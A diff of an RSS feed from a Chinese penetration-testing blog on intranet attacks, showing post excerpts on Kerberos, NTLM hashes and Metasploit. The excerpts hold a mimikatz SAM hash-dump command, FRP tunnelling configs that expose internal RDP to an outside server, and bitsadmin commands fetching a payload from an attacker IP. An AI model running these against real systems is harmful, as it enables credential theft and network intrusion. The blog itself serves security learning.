@@ -1,110 +1,258 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>intranet on Reber&#39;s Blog</title>
-    <link>https://wyb0.com/tags/intranet/</link>
-    <description>Recent content in intranet on Reber&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sat, 25 Mar 2023 00:00:00 +0000</lastBuildDate>
-    <atom:link href="https://wyb0.com/tags/intranet/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>使用 MSF 进行 PtH 和 PtT</title>
-      <link>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</link>
-      <pubDate>Sat, 25 Mar 2023 00:00:00 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</guid>
-      <description>0x00 概述 环境 攻击机 MSF：172.20.10.2 DC (Server2008R2X64)：10.11.11.5 目标机 (Win7</description>
-    </item>
-    <item>
-      <title>Kerberos 与 NTLM Hash 与 Ticket</title>
-      <link>https://wyb0.com/posts/2022/kerberos-hash-ticket/</link>
-      <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2022/kerberos-hash-ticket/</guid>
-      <description>0x00 Kerberos Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。 常见的基于 Kerberos 协议攻击的方法如下图所示： 0x01</description>
-    </item>
-    <item>
-      <title>获取 NTLM Hash</title>
-      <link>https://wyb0.com/posts/2020/get-hash/</link>
-      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2020/get-hash/</guid>
-      <description>0x01 通过 sam 文件获取 通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限) mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit 通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd</description>
-    </item>
-    <item>
-      <title>FRP 内网穿透</title>
-      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
-      <pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
-      <description>0x00 对外提供简单的文件访问服务 服务端 ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389 ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on</description>
-    </item>
-    <item>
-      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
-      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
-      <pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
-      <description>0x00 一些概念 Windows 认证协议 分为：基于 NTLM 的认证和基于 kerberos 的认证 什么是 NTLM Hash？ 早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性</description>
-    </item>
-    <item>
-      <title>Metasploit 简单提权</title>
-      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
-      <pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
-      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72</description>
-    </item>
-    <item>
-      <title>Windows 终端下载文件和执行远程文件</title>
-      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
-      <pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
-      <description>环境：Windows Server 2008 R2 Enterprise 0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe 0x01 certutil下载文</description>
-    </item>
-    <item>
-      <title>脏牛漏洞</title>
-      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
-      <pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
-      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，</description>
-    </item>
-    <item>
-      <title>Metasploit 利用 workspace 进行批量扫描爆破</title>
-      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
-      <pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
-      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的</description>
-    </item>
-    <item>
-      <title>Ubuntu 下安装 Metasploit</title>
-      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
-      <pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
-      <description>0x00 安装Metasploit 下载msfinstall脚本 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall 修改文件权限 $ chmod 755 msfinstall 安装(可能时间较久) $ ./msfinstall 更新exp $</description>
-    </item>
-    <item>
-      <title>Linux 下系统漏洞提权</title>
-      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
-      <pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
-      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤： 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反</description>
-    </item>
-    <item>
-      <title>导出 Windows 主机密码与开启 3389</title>
-      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
-      <pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
-      <description>0x00 导出主机密码hash 关于Windows的hash 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提</description>
-    </item>
-    <item>
-      <title>Windows 下第三方服务提权</title>
-      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
-      <pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
-      <description>0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权 提权条件：数据库账</description>
-    </item>
-    <item>
-      <title>Windows 下系统漏洞提权</title>
-      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
-      <pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
-      <description>提权是在已经getshell但是权限不大的前提下做的 0x00 查看基本信息 0x01 使用cmd执行命令 尝试使用cmd执行命令 找可写目录 尝</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intranet on Reber's Blog</title><link>https://wyb0.com/tags/intranet/</link><description>Recent content in Intranet on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sat, 25 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/intranet/index.xml" rel="self" type="application/rss+xml"/><item><title>使用 MSF 进行 PtH 和 PtT</title><link>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</link><pubDate>Sat, 25 Mar 2023 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</guid><description>&lt;h3 id="0x00-概述">0x00 概述&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>环境&lt;/p>
+&lt;p>攻击机 MSF：172.20.10.2&lt;br>
+DC (Server2008R2X64)：10.11.11.5&lt;br>
+目标机 (Win7ProX86)：10.11.11.14&lt;/p></description></item><item><title>Kerberos 与 NTLM Hash 与 Ticket</title><link>https://wyb0.com/posts/2022/kerberos-hash-ticket/</link><pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2022/kerberos-hash-ticket/</guid><description>&lt;h3 id="0x00-kerberos">0x00 Kerberos&lt;/h3>
+&lt;p>Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。
+常见的基于 Kerberos 协议攻击的方法如下图所示：
+&lt;img src="https://wyb0.com/img/post/Xnip2022-10-13_17-09-29.png" alt="60">&lt;/p>
+&lt;h3 id="0x01-kerberos-关键词">0x01 Kerberos 关键词&lt;/h3>
+&lt;ul>
+&lt;li>域控制器（Domain Controller，DC）：在域中至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。&lt;/li>
+&lt;li>帐户数据库（Account Database，AD）：一个类似于 Windows 本机 SAM 的数据库，存储了域内所有网络对象的凭证，也存储所有 Client 的白名单，在白名单中的 Client 才可以申请到 TGT。&lt;/li>
+&lt;li>密钥分发中心（Key Distribution Center，KDC）：KDC 维护着域中所有安全主体（SecurityPrincipal）账户信息数据库，负责管理票据、认证票据、分发票据，在 Windows 域环境中，KDC 的角色由 DC 承担。&lt;/li>
+&lt;li>身份验证服务（Authentication Service，AS）：用于生成 TGT 的服务。&lt;/li>
+&lt;li>票据发放服务（Ticket Granting Service，TGS）：用于生成某个服务的 ticket&lt;/li>
+&lt;li>认证票据（Ticket Granting Ticket，TGT）：可以理解为入场券，通过入场券能够获得票据，是一种临时凭证的存在。&lt;/li>
+&lt;li>票据（Ticket）：网络对象互相访问的凭证。&lt;/li>
+&lt;li>Session Key：AS 生成的随机会话密钥。&lt;/li>
+&lt;li>Server Session Key：TGS 生成的随机会话密钥。&lt;/li>
+&lt;li>krbtgt 账户：每个域控制器都有一个 krbtgt 的用户账户，是 KDC 的服务账户，用来创建票据授予服务(TGS)加密的密钥。&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x02-kerberos-认证过程">0x02 Kerberos 认证过程&lt;/h3>
+&lt;p>认证的大致过程：&lt;/p></description></item><item><title>获取 NTLM Hash</title><link>https://wyb0.com/posts/2020/get-hash/</link><pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2020/get-hash/</guid><description>&lt;h3 id="0x01-通过-sam-文件获取">0x01 通过 sam 文件获取&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)&lt;/p>
+&lt;pre tabindex="0">&lt;code>mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>
+&lt;p>通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)&lt;/p></description></item><item><title>FRP 内网穿透</title><link>https://wyb0.com/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
+&lt;ul>
+&lt;li>服务端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 监听端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 那些端口允许客户端用来映射&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">allow_ports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">22-80,3000,33389&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>➜ frp ./frps -c frps.ini
+2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000
+2019/07/31 00:22:31 [I] [root.go:204] Start frps success
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>客户端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[test_static_file]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 文件服务的端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 启用插件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">static_file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 要对外暴露的文件目录&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_local_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">C:\\Users\Administrator\Desktop\frp_file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_strip_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">myfile&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 301 认证&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">admin&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_passwd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">123456&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
+2019/07/31 00:36:05 [I] [service.go:221] login to server success, get run id [c8
+aef41d5862b79f], server udp port [0]
+2019/07/31 00:36:05 [I] [proxy_manager.go:137] [c8aef41d5862b79f] proxy added: [
+test_static_file]
+2019/07/31 00:36:05 [I] [control.go:144] [test_static_file] start proxy success
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>访问&lt;br>
+浏览器直接访问 &lt;code>http://66.123.35.123:3000/myfile/&lt;/code> 即可访问到 frp_file 中的文件&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x01-使用-frp-进行内网-3389-端口转发并加密压缩">0x01 使用 frp 进行内网 3389 端口转发并加密压缩&lt;/h3>
+&lt;ul>
+&lt;li>服务端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp ./frps -c frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [root.go:204] Start frps success&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>客户端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[rdp]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">33389&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 加密压缩&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_encryption&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_compression&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
+2019/07/30 23:32:38 [I] [service.go:221] login to server success, get run id [ce
+144f7511f63353], server udp port [0]
+2019/07/30 23:32:38 [I] [proxy_manager.go:137] [ce144f7511f63353] proxy added: [
+rdp]
+2019/07/30 23:32:38 [I] [control.go:144] [rdp] start proxy success
+&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>内网渗透之 Responder 与 Net-NTLM hash</title><link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link><pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate><guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid><description>&lt;h3 id="0x00-一些概念">0x00 一些概念&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>Windows 认证协议&lt;/p>
+&lt;p>分为：基于 NTLM 的认证和基于 kerberos 的认证&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>什么是 NTLM Hash？&lt;/p>
+&lt;p>早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash&lt;/p></description></item><item><title>Metasploit 简单提权</title><link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link><pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate><guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
+&lt;p>虚拟机有一个shell：&lt;code>http://10.11.11.20/a.php&lt;/code>，物理机IP是211.222.222.72&lt;br>
+外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195&lt;/p></description></item><item><title>Windows 终端下载文件和执行远程文件</title><link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link><pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate><guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid><description>&lt;p>环境：Windows Server 2008 R2 Enterprise&lt;/p>
+&lt;h3 id="0x00-bitsadmin下载文件">0x00 bitsadmin下载文件&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.zip
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-certutil下载文件">0x01 certutil下载文件&lt;/h3>
+&lt;p>保存在当前目录&lt;/p></description></item><item><title>脏牛漏洞</title><link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link><pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate><guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid><description>&lt;h3 id="0x00-测试环境">0x00 测试环境&lt;/h3>
+&lt;p>我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p></description></item><item><title>Metasploit 利用 workspace 进行批量扫描爆破</title><link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link><pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate><guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid><description>&lt;h3 id="0x00-启动">0x00 启动&lt;/h3>
+&lt;p>&lt;img src="https://wyb0.com/img/post/msf_start.png" alt="启动msf">&lt;/p>
+&lt;h3 id="0x01-metasploit的工作平台">0x01 Metasploit的工作平台&lt;/h3>
+&lt;p>在msf里的工作平台可以保存历史的一些操作信息
+&lt;img src="https://wyb0.com/img/post/msf_workspace_h.png" alt="msf工作平台的帮助信息">
+&lt;img src="https://wyb0.com/img/post/msf_workspace.png" alt="创建新的工作平台">&lt;/p>
+&lt;h3 id="0x02-使用db_nmap扫描主机">0x02 使用db_nmap扫描主机&lt;/h3>
+&lt;p>&lt;img src="https://wyb0.com/img/post/msf_nmap_lanou3g_ip.png" alt="扫描lanou3g的ip信息">
+扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：
+&lt;img src="https://wyb0.com/img/post/msf_hosts.png" alt="查看主机列表">
+&lt;img src="https://wyb0.com/img/post/msf_services.png" alt="查看服务">&lt;/p></description></item><item><title>Ubuntu 下安装 Metasploit</title><link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link><pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate><guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid><description>&lt;h3 id="0x00-安装metasploit">0x00 安装Metasploit&lt;/h3>
+&lt;ul>
+&lt;li>下载msfinstall脚本&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>修改文件权限&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ chmod 755 msfinstall
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>安装(可能时间较久)&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ ./msfinstall
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>更新exp&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ msfupdate
+&lt;/code>&lt;/pre>&lt;h3 id="0x01-连接数据库">0x01 连接数据库&lt;/h3>
+&lt;ul>
+&lt;li>首先启动postgresql数据库&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ /etc/init.d/postgresql start #service postgresql start也可以
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>初始化MSF数据库(关键步骤)&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ msfdb init
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>运行msfconsole&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$ msfconsole
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>在msf中查看数据库连接状态&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>msf &amp;gt; db_status
+#若出现错误：Module database cache not built yet, using slow search
+#则重新构建缓存，缓存构建通常需要5-10分钟左右。
+#构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块
+msf &amp;gt; db_rebuild_cache
+&lt;/code>&lt;/pre>&lt;h3 id="0x02-metasploit-cheat-sheet">0x02 Metasploit Cheat Sheet&lt;/h3>
